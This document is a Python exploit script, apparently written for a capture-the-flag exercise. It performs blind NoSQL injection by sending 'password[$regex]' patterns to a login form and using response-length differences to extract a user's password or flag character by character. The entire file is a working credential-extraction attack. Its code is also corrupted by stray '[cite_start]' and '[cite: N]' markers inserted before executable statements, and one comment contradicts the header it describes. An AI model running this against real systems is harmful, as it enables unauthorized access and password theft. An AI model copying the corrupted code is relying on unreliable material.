import requests
import string
import sys
import re

# --- CONFIGURATION INPUTS ---
# [cite_start]TARGET_URL: The full HTTP/HTTPS path to the login or search endpoint [cite: 1]
TARGET_URL = "http://<TARGET_IP_OR_URL>/" 

# [cite_start]USERNAME: A valid username on the system to test against [cite: 1]
USERNAME = "admin_placeholder" 

# [cite_start]CHARSET: The list of characters the script will attempt to "guess" [cite: 2]
# [cite_start]Includes alphanumeric and common SQL special characters [cite: 2]
SPECIALS = "!@#$%^&*()_+. ;"
CHARSET = string.ascii_letters + string.digits + SPECIALS

def escape_regex_char(char):
    """
    Input: Single character.
    [cite_start]Output: Escaped character if it has special Regex meaning (e.g., '.' becomes '\.') [cite: 3]
    """
    if char in "[]().*+?^$|{}":
        return "\\" + char
    return char

def get_response_length(regex_pattern):
    """
    [cite_start]Input: A regex string used to probe the database [cite: 4]
    [cite_start]This function sends a POST request with 'password[$regex]' as the payload [cite: 3, 4]
    """
    form_data = {
        "username": USERNAME,
        "password[$regex]": regex_pattern
    }
    # [cite_start]Headers mimic a standard browser request to avoid basic bot detection [cite: 4]
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Security-Researcher-Script"
    }
    try:
        response = requests.post(TARGET_URL, data=form_data, headers=headers, timeout=5)
        [cite_start]return len(response.content) # Output: Length used for boolean comparison [cite: 4]
    except Exception as e:
        return 0

def extract_flag():
    """
    Automates the extraction process by comparing current response length
    [cite_start]against a known 'Failure' baseline [cite: 7, 11]
    """
    # [cite_start]Baseline Input: A pattern guaranteed to fail (e.g., a long random string) [cite: 7]
    fail_len = get_response_length("^ZZZZZZ.*$")
    current_flag = ""
    
    # [cite_start]Loop for extraction (up to 100 characters) [cite: 8]
    for i in range(len(current_flag) + 1, 101):
        found = False
        for char in CHARSET:
            safe_char = escape_regex_char(char)
            safe_current_flag = "".join([escape_regex_char(c) for c in current_flag])
            [cite_start]pattern = f"^{safe_current_flag}{safe_char}.*$" [cite: 9]
            
            # [cite_start]If length differs from baseline, the character is correct [cite: 11]
            if get_response_length(pattern) != fail_len:
                current_flag += char
                found = True
                [cite_start]print(f"[SUCCESS] Position {i}: {char} | Flag: {current_flag}") [cite: 12]
                break
        if not found: 
            [cite_start]print(f"[DONE] Extraction complete at position {i}") [cite: 13]
            break
    print(f"[FINAL RESULT] {current_flag}")

if __name__ == "__main__":
    extract_flag()
